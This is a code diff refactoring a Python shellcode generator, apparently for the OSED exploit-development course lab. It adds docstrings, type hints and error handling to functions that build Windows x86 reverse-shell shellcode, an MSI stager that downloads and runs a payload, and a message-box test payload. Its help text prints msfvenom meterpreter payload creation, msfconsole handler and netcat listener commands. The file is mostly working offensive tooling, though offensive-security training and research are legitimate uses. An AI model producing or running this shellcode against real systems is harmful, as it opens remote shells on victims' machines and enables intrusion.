@@ -1,18 +1,39 @@
 #!/usr/bin/python3
+"""
+shellcoder.py - Create custom shellcodes compatible with OSED lab VM
+
+Supports three types of shellcode:
+1. Pure reverse shell - Connects back to attacker
+2. MSI stager - Downloads and executes MSI payload (shorter)
+3. Message box - For testing purposes
+"""
 import sys
 import argparse
-import ctypes, struct, numpy
+import ctypes
+import struct
+from typing import List, Tuple
+import numpy
 import keystone as ks
 
 
-def to_hex(s):
-    retval = list()
+def to_hex(s: str) -> str:
+    """Convert a string to its hex representation."""
+    retval = []
     for char in s:
         retval.append(hex(ord(char)).replace("0x", ""))
     return "".join(retval)
 
 
-def to_sin_ip(ip_address):
+def to_sin_ip(ip_address: str) -> str:
+    """
+    Convert an IP address to sin_addr format (little-endian hex).
+
+    Args:
+        ip_address: IP address string (e.g., '192.168.1.1')
+
+    Returns:
+        Hex string in little-endian format (e.g., '0x0101a8c0')
+    """
     ip_addr_hex = []
     for block in ip_address.split("."):
         ip_addr_hex.append(format(int(block), "02x"))
@@ -20,31 +41,74 @@ def to_sin_ip(ip_address):
     return "0x" + "".join(ip_addr_hex)
 
 
-def to_sin_port(port):
+def to_sin_port(port: str) -> str:
+    """
+    Convert a port number to sin_port format (network byte order).
+
+    Args:
+        port: Port number as string (e.g., '4444')
+
+    Returns:
+        Hex string in network byte order (e.g., '0x5c11')
+    """
     port_hex = format(int(port), "04x")
     return "0x" + str(port_hex[2:4]) + str(port_hex[0:2])
 
 
-def ror_str(byte, count):
+def ror_str(byte: int, count: int) -> int:
+    """
+    Rotate right operation used for hash calculation.
+
+    Args:
+        byte: Integer value to rotate
+        count: Number of bits to rotate
+
+    Returns:
+        Rotated integer value
+    """
     binb = numpy.base_repr(byte, 2).zfill(32)
     while count > 0:
         binb = binb[-1] + binb[0:-1]
         count -= 1
-    return (int(binb, 2))
+    return int(binb, 2)
 
 
-def push_function_hash(function_name):
+def push_function_hash(function_name: str) -> str:
+    """
+    Calculate and return assembly instruction to push function hash.
+
+    This implements the ROR13 hash algorithm commonly used in shellcode
+    to locate API functions dynamically.
+
+    Args:
+        function_name: Name of the Windows API function
+
+    Returns:
+        Assembly instruction string (e.g., 'push 0x12345678')
+    """
     edx = 0x00
     ror_count = 0
     for eax in function_name:
         edx = edx + ord(eax)
-        if ror_count < len(function_name)-1:
+        if ror_count < len(function_name) - 1:
             edx = ror_str(edx, 0xd)
         ror_count += 1
-    return ("push " + hex(edx))
+    return "push " + hex(edx)
 
 
-def push_string(input_string):
+def push_string(input_string: str) -> str:
+    """
+    Generate assembly instructions to push a string onto the stack.
+
+    This function generates optimal assembly code to push a null-terminated
+    string onto the stack in reverse order (for stack-based string building).
+
+    Args:
+        input_string: String to push onto the stack
+
+    Returns:
+        Assembly instructions as a string
+    """
     rev_hex_payload = str(to_hex(input_string))
     rev_hex_payload_len = len(rev_hex_payload)
 
@@ -53,11 +117,11 @@ def push_string(input_string):
     null_terminated = False
     for i in range(rev_hex_payload_len, 0, -1):
         # add every 4 byte (8 chars) to one push statement
-        if ((i != 0) and ((i % 8) == 0)):
+        if (i != 0) and ((i % 8) == 0):
             target_bytes = rev_hex_payload[i-8:i]
             instructions.append(f"push dword 0x{target_bytes[6:8] + target_bytes[4:6] + target_bytes[2:4] + target_bytes[0:2]};")
-        # handle the left ofer instructions
-        elif ((0 == i-1) and ((i % 8) != 0) and (rev_hex_payload_len % 8) != 0):
+        # handle the leftover instructions
+        elif (0 == i-1) and ((i % 8) != 0) and (rev_hex_payload_len % 8) != 0:
             if (rev_hex_payload_len % 8 == 2):
                 first_instructions.append(f"mov al, 0x{rev_hex_payload[(rev_hex_payload_len - (rev_hex_payload_len%8)):]};")
                 first_instructions.append("push eax;")
@@ -78,7 +142,24 @@ def push_string(input_string):
     return asm_instructions
 
 
-def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
+def rev_shellcode(rev_ip_addr: str, rev_port: str, breakpoint: int = 0) -> str:
+    """
+    Generate reverse shell shellcode assembly.
+
+    Creates position-independent shellcode that:
+    1. Finds kernel32.dll and ws2_32.dll dynamically
+    2. Resolves required API functions using ROR13 hashing
+    3. Creates a socket and connects back to the attacker
+    4. Spawns cmd.exe with I/O redirected to the socket
+
+    Args:
+        rev_ip_addr: Attacker's IP address
+        rev_port: Attacker's listening port
+        breakpoint: If 1, insert int3 breakpoint at the start
+
+    Returns:
+        Assembly code string for the reverse shell
+    """
     push_instr_terminate_hash = push_function_hash("TerminateProcess")
     push_instr_loadlibrarya_hash = push_function_hash("LoadLibraryA")
     push_instr_createprocessa_hash = push_function_hash("CreateProcessA")
@@ -286,7 +367,21 @@ def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
     return "\n".join(asm)
 
 
-def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0):
+def msi_shellcode(rev_ip_addr: str, rev_port: str, breakpoint: int = 0) -> str:
+    """
+    Generate MSI stager shellcode assembly.
+
+    Creates a smaller shellcode that downloads and executes an MSI payload
+    via msiexec. This is useful when space is limited.
+
+    Args:
+        rev_ip_addr: Attacker's IP address (serving the MSI file)
+        rev_port: HTTP server port
+        breakpoint: If 1, insert int3 breakpoint at the start
+
+    Returns:
+        Assembly code string for the MSI stager
+    """
     # strip the port if it is 80
     if rev_port == "80":
         rev_port = ""
@@ -401,7 +496,21 @@ def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0):
     return "\n".join(asm)
 
 
-def msg_box(header, text, breakpoint=0):
+def msg_box(header: str, text: str, breakpoint: int = 0) -> str:
+    """
+    Generate message box shellcode assembly.
+
+    Creates shellcode that displays a Windows message box. Useful for
+    proof-of-concept and testing purposes.
+
+    Args:
+        header: Message box title
+        text: Message box content
+        breakpoint: If 1, insert int3 breakpoint at the start
+
+    Returns:
+        Assembly code string for the message box
+    """
     # MessageBoxA() in user32.dll
     push_instr_user32 = push_string("user32.dll")
     push_instr_msgbox_hash = push_function_hash("MessageBoxA")
@@ -517,46 +626,86 @@ def msg_box(header, text, breakpoint=0):
     return "\n".join(asm)
 
 
+def check_bad_chars(encoding: bytes, bad_chars: List[str]) -> None:
+    """
+    Check if any bad characters are present in the shellcode.
+
+    Args:
+        encoding: Assembled bytes of the shellcode
+        bad_chars: List of hex strings representing bad characters
+
+    Raises:
+        SystemExit: If bad characters are found in the encoding
+    """
+    final = 'shellcode = b"'
+    for enc in encoding:
+        final += "\\x{0:02x}".format(enc)
+    final += '"'
+
+    found_bad_chars = []
+    for bad in bad_chars:
+        if bad in final:
+            found_bad_chars.append(bad)
+            print(f"[!] Found bad character: 0x{bad}")
+
+    if found_bad_chars:
+        print(f"[=] {final}", file=sys.stderr)
+        print(f"[!] Bad characters found: {', '.join('0x' + bc for bc in found_bad_chars)}", file=sys.stderr)
+        raise SystemExit("[!] Remove bad characters and try again")
+
+
 def main(args):
+    """Main function to generate and display shellcode."""
     help_msg = ""
-    if (args.msi):
-        shellcode = msi_shellcode(args.lhost, args.lport, args.debug_break)
+
+    # Validate messagebox arguments
+    if args.messagebox and (not args.mb_header or not args.mb_text):
+        print("[!] --messagebox requires both --mb-header and --mb-text arguments", file=sys.stderr)
+        raise SystemExit(1)
+
+    try:
+        if args.msi:
+            shellcode = msi_shellcode(args.lhost, args.lport, args.debug_break)
         help_msg += f"\t Create msi payload:\n"
         help_msg += f"\t\t msfvenom -p windows/meterpreter/reverse_tcp LHOST={args.lhost} LPORT=443 -f msi -o X\n"
         help_msg += f"\t Start http server (hosting the msi file):\n"
         help_msg += f"\t\t sudo python -m SimpleHTTPServer {args.lport} \n"
         help_msg += f"\t Start the metasploit listener:\n"
-        help_msg += f'\t\t sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {args.lhost}; set LPORT 443; exploit"'
-    elif (args.messagebox):
-        shellcode = msg_box(args.mb_header, args.mb_text, args.debug_break)
-    else:
-        shellcode = rev_shellcode(args.lhost, args.lport, args.debug_break)
-        help_msg += f"\t Start listener:\n"
-        help_msg += f"\t\t nc -lnvp {args.lport}"
+            help_msg += f'\t\t sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {args.lhost}; set LPORT 443; exploit"'
+        elif args.messagebox:
+            shellcode = msg_box(args.mb_header, args.mb_text, args.debug_break)
+        else:
+            shellcode = rev_shellcode(args.lhost, args.lport, args.debug_break)
+            help_msg += f"\t Start listener:\n"
+            help_msg += f"\t\t nc -lnvp {args.lport}"
+    except Exception as e:
+        print(f"[!] Failed to generate shellcode: {e}", file=sys.stderr)
+        raise SystemExit(1)
 
     print(shellcode)
-    eng = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
-    encoding, count = eng.asm(shellcode)
+
+    try:
+        eng = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
+        encoding, count = eng.asm(shellcode)
+    except ks.KsError as e:
+        print(f"[!] Assembly failed: {e}", file=sys.stderr)
+        raise SystemExit(1)
+    except Exception as e:
+        print(f"[!] Failed to initialize keystone engine: {e}", file=sys.stderr)
+        raise SystemExit(1)
+
+    if not encoding:
+        print("[!] Failed to generate shellcode: no bytes were assembled", file=sys.stderr)
+        raise SystemExit(1)
 
     final = ""
-
     final += 'shellcode = b"'
-
     for enc in encoding:
         final += "\\x{0:02x}".format(enc)
-
     final += '"'
 
-    sentry = False
-
-    for bad in args.bad_chars:
-        if bad in final:
-            print(f"[!] Found 0x{bad}")
-            sentry = True
-
-    if sentry:
-        print(f"[=] {final}", file=sys.stderr)
-        raise SystemExit("[!] Remove bad characters and try again")
+    # Check for bad characters
+    check_bad_chars(encoding, args.bad_chars)
 
     print(f"[+] shellcode created!")
     print(f"[=]   len:   {len(encoding)} bytes")
@@ -565,12 +714,14 @@ def main(args):
     print(
         f"[=]   break: {['breakpoint disabled', 'breakpoint active'][args.debug_break]}"
     )
-    print(f"[=]   ver:   {['pure reverse sehll', 'MSI stager'][args.msi]}")
+    print(f"[=]   ver:   {['pure reverse shell', 'MSI stager'][args.msi]}")
     if args.store_shellcode:
-        print(f"[=]   Shellcode stored in: shellcode.bin")
-        f = open("shellcode.bin", "wb")
-        f.write(bytearray(encoding))
-        f.close()
+        try:
+            with open("shellcode.bin", "wb") as f:
+                f.write(bytearray(encoding))
+            print(f"[=]   Shellcode stored in: shellcode.bin")
+        except IOError as e:
+            print(f"[!] Failed to write shellcode.bin: {e}", file=sys.stderr)
     print(f"[=]   help:")
     print(help_msg)
     print("\t Remove bad chars with msfvenom (use --store-shellcode flag): ")
@@ -580,7 +731,10 @@ def main(args):
     print()
     print(final)
 
-    if args.test_shellcode and (struct.calcsize("P")*8) == 32:
+    if args.test_shellcode:
+        if (struct.calcsize("P") * 8) != 32:
+            print("[!] Shellcode testing only supported on 32-bit systems", file=sys.stderr)
+            return
         print(f"\n[+] Debugging shellcode ...")
         sh = b""
         for e in encoding:
